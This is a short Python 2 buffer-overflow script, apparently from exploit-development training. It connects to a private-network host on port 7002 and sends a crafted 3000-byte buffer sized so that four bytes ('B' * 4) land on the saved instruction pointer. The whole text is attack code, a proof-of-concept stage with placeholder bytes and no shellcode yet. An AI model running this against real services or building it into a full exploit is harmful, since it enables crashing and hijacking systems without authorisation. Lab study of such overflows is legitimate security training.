#!/usr/bin/python
import socket
try:
  print "\nSending evil buffer..."
  filler = "A" * 2080
  eip = "B" * 4
  rest = "C" * 916
  buffer = filler + eip + rest 
  s = socket.socket (socket.AF_INET, socket.SOCK_STREAM)
  s.connect(("192.168.170.10", 7002))
  s.send(buffer)
  s.close()
  print "\nDone!"
except:
  print "\nCould not connect!"


